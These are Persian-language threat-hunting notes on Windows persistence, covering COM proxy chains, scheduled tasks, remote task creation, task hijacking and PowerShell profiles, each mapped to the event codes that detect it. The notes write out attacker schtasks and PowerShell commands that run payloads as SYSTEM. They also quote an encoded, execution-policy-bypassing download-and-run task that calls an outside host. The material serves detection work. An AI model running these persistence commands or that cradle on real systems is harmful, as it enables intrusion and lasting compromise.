

##  com proxy chain
یکی دیگر از روش هایی که وجود دارد com proxy chain هست به این صورت هست 
که بیایم چندتا clsid درست کنیم توهم توهم بعد همه اینارو chain کنیم 


```
registry.path : ("HKEY_USERS\\*Classes\\*\InprocServer32\\"
"HKEY USERS\\*Classes\\*\LocalServer32\\"
"HKEY USERS\\*Classes\\*DelegateExecute\\"
"HKEY USERS\ \*Classes\ \*TreatAs\\",
"HKEY USERS\\*Classes\\CLSID\\*\ScriptletURL\\") and
/* not necessary but good for filtering privileged installations */
user. domain != "NT AUTHORITY")
```


#### baseline

از اونجایی که پروسس ها هم از این com ها استفاده میکنند ما باید یه baseline درست کنیم و tunnig  انجام بدیم 




----


## schedule task


```
schtask /create /ru
```

سوییچی که  خیلی مهمه /ru به این معنی است که این تسک با چه دسترسی اجرا بشه 

خیلی از مهاجمین از این سوییچ استفاده میکنند برای اینکه تسک شون رو با سطح دسترسی SYSTEM اجرا کنن


مهاجمین ممکنه از schedule task استفاده کنن برای اینکه بیان از طریق rundll32 ابزارشون رو اجرا کنن یعنی component شون رو 
این chain میتونه لاگ بیشتری تولید کنه و این تولید لاگ میتونه شناسایی رو سخت تر کنه 


```
schedule task 
|
|
|
rundll32.exe /sta {CLSID}
|
|
|
runkey registry 
|
|
|
payload 
|
|
|
rundll32.exe -sta {CLSID}
|
|
|
```


proxy chain
```
schtask /create /ru SYSTEM /sc onlogon /tn my_task /tr  "rundll32.exe /sta {clsid}"
```


non proxy
```
schtask /create /ru SYSTEM /sc onlogon /tn my_task /tr "rundll32.exe mydll.dll,main"
```


## Com Proxy + Schedule Task 

اسکجول تسک به صورت پیش فرض لاگش تو event viewwer ریخته میشه 


نکته :

بریم باهم دیگه لاگ های اسکجول تسک رو فعال کنیم 


![[Pasted image 20260521151922.png]]


![[Pasted image 20260521152112.png]]

این قسمت رو باید فعال کنیم تا لاگ های schedule task رو هم داشته باشیم 


```
auditpol /get /category:*
```

با استفاده از این ابزار هم میتونیم لیست policy هارو ببینیم و اون object که مد نظرمون هست رو فعال کنیم 


![[Pasted image 20260521152429.png]]



حالا بعد ا اینکه فعال کردیم وارد event viewver میشیم و در قسمت securtiy دنبال ***event code 4698*** میگردیم 

یکی از دلایلی که سازمان های SOC ها توجهی به لاگ های schedule task نمیکنن همین نوع لاگی هست که تولید میشه 


![[Pasted image 20260521161019.png]]


اگر به نوع لاگ دقت کنید لاگ xml هستش و همین دلیل تشخیص لاگ رو سخت تر میکنه



ما میتونیم همین schedule task رو هم کوئری بزنیم و محتواش ببینیم داخل همون cmd 

```
schtasks.exe /query /tn charon  /xml
```


##### Schedule Task ----> Create,Update,Delete,Enable 

هر اسکجول تسکی که روی سیستم ساخته میشه در sysmon

-  Event Code 13 

که مربوط به ریجستری ها هستش قابل مشاهده هست 


![[Pasted image 20260521161323.png]]


![[Pasted image 20260521161805.png]]


پس چیزی که ما باید دنبالش بگردیم مسیری tasks در ریجستری هست که مشخص کننده schedule task ها هستش 

و schedule task ها همشون داخل مسیر 

- C:\windows\system32\tasks

نوشته می شوند 


![[Pasted image 20260521162052.png]]

همونطور که میبینید task ما وجود دارد 

میتوینم توی این مسیر بیایم و دنبال event code 11 بگیردیم  که اگر file create شد متوجه ساخت schedule بشیم 


C:\windows\system32\tasks ---->: EventCode 11

ما تو قسمت action تو schedule میتونیم مشخص کنیم این task رو کی اجرا بکنه


----

ما تا الان مقدمه یی روی schedule task داشتیم بیایم تو مرحله بعدی بریم schedule task رو با روش های دیگری بسازیم از جمله 

- powershell
- com object


![[Pasted image 20260521162828.png]]

### یه سری اسکجول تسک ها نسبت به بقیه میتونه خطرناک تر باشه 


![[Pasted image 20260521162928.png]]

![[Pasted image 20260521162936.png]]


EventCode= 4698 

یعنی schedule task ساخته شده 

EventCode = 4699

یعنی Schedule Task پاک شد

اگر به فاصله یک دقیقه این اتفاق افتاد سریعا باید برسی های لازم رو انجام بدیم




### Create Schedule Task via PowerShell
```powershell
powershell schtask

$user = 'workgroup\test'
$passwd = ConvertTo-SecureString -String "123123" -AsPlainText -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList @($user,$passwd)
$session = New-CimSession -ComputerName 127.0.0.1 -Credential $cred -SessionOption (New-CimSessionOption -Protocol Dcom)
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c echo 4 > c:\aa.txt" -WorkingDirectory "c:\windows\system32" -CimSession $session
Register-ScheduledTask -Action $action -CimSession $session -TaskName "ravin" -User "SYSTEM"
Start-ScheduledTask -CimSession $session -TaskName "ravin"
```


ما از طریق Event Code 1 sysmon هم میتونیم بیایم و روی process حساس بشیم 

- schtasks.exe

اگر این process رو دیدیم لاگ کنیم 

اما فقط همه اینا نیست 


```powershell
3.cmd.exe /c schtasks /create /ru system /sc MINUTE /mo 50 /st 07:00:00 /tn ""\Microsoft\windows\Bluetooths"" /tr
""powershell -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbw
BhAGQAcwBOAHIAaQBuAGcAKAAnAGgAdAB0AHAA0gAvAC8AdgAuAGIAZQBhAGgAaAAuAGMAbwBtAC8AdgAnACsAJABLAG4AdgA6AFUAUwBFAFIARABPAE0AQQBJAE4
AKQA=""
```

همونطور که میبینید schedule task به صورت encode شده ساخته شده و به مسیرش هم دقت کنید داخل bluetooths هستش پس ما نباید صرفا به مسیر وابسته باشیم 



---


### Remote Schedule Tasks 


یه زمانی هست مهاجم مثلا تونسته Exchange رو بزنه و میخواد به صورت Remote  یه Schedule Task بسازه 


```
Exchange -----> Remote Schedule Task
Schedule Task ----> file 
file ----> share
Authintecation
```

پس برای اینکه این file رو سیستم هدف به وجود بیاد یا ببریمش باید از طریق یه share اینکارو کنیم 

 اما خوده share نکته یی که داره اینه که باید بیایم جدا audit policy مربوط بهش رو فعال کنیم تا لاگ هاشو  بگیریم

![[Pasted image 20260521164454.png]]


![[Pasted image 20260521164525.png]]

این دوتارو باید فعال کنیم تا لاگ هاشو به درستی بگیریم


پس ما تو لاگ ها Connection های network هم داریم 

حالا اینجا یه مفهمومی داریم تحت عنوان Named Pipe 

این روش یکی دیگر از روش های IPC/RPC هستش که این اجازه رو میده process ها باهم ارتباط برقرار کنند

پس این Remote Schedule Task بخواد ساخته بشه  از طریق این پرتوکل ساختته میشه و از طریق EventCode 

- 17
- 18 

در sysmon می تونیم ببینیم 

اما سوال ؟؟؟ اسم pipe چیه 

- atsvc Named Pipe 
این Pipe روی protocol RPC هستش 

طریقه ساختش هم در قدم اول به این صورت هستش 

```
schtasks /create /s
```

/s 
مشخص کننده Remote بودنش هست 

ما از طریق 

EventCode=5145

میتونیم ببینیمش


![[atsvc_5145.png]]


![[remote task creation.png]]

پس ما یه 

EventCode = 5145 ----> atsvc 

که Remote Schedule Task رو میگفت 

EventCode=4624

که Authenticaton رو میگفت 

اگر به فیلد logonID دقت کنید یکیه پس remote به درستی اتفاق اتفاده 


مورد بعدی ما باید Event Code 4698 رو هم ببینیم رو سیستم تارگت 

پس EventCode هایی که میتونیم بهم ربط بدیم و corolate کنیم 

EventCode = 4698 
EventCode = 4624 

فیلد logonID باید یکسان باشد 

اگر فیلد logonID که در EventCode 4624 داشتیم در EventCode 4698 داشتیم همون بود پس 100% Remote Schedule Task داریم 


یه زمانی هستش که سازمان متوجه ساخت schedule میشه اما مهاجم چیکار میکنه میاد یکی از schedule های خوده سیستم بخش exec رو با بخش قبلی  replcae میکنه 



```shell
schtasks /query /tn MicrosoftEdgeUpdateTaskMachineCore /xml
```

![[Pasted image 20260521171436.png]]

بخش exec با payload خودمون عوض میشه و در نهایت همون schedule task اجرا میشه 


```
schtasks /query /tn MicrosoftEdgeUpdateTaskMachineCore /xml > schedule.xml
```

بعد باز میکنیم مجتوای اون تگ exec رو با محتوای خودمون عوض میکنیم و همون رو دوباره replcae میکنیم 


تو این قسمت ما باید دنبال 

Event Code = 4702 

بگردیم که مربوط به Update Schedule Task هست

مهاجمان ممکن است با این روش بیان persistence انجام بدن چون یک schedule task سیستمی یه کاره دیگه از این به بعد انجام میده 



---


 ### PowerShell Profile


![[Pasted image 20260522221859.png]]

![[Pasted image 20260522221942.png]]


اما خب ما همه اینارو گفتیم اما powershell profile یعنی چی 

زمانی که ما میایم powershell رو باز میکنیم یک profile رو داریم که این profile میاد برای ما یه کاری انجام میده  مثلا 


![[Pasted image 20260522222141.png]]


همونطور که میبینید زمانی که powershell اجرا شده یه دستوری هم همراش اجرا شده این همون profile هستش

اینم یکی دیگر از راه هایی برای persistence هستش


چطور میشه hunt کرد 

#### در EventCode 11 sysmon باید دنبال همون مسیر powershell profile بگردیم 

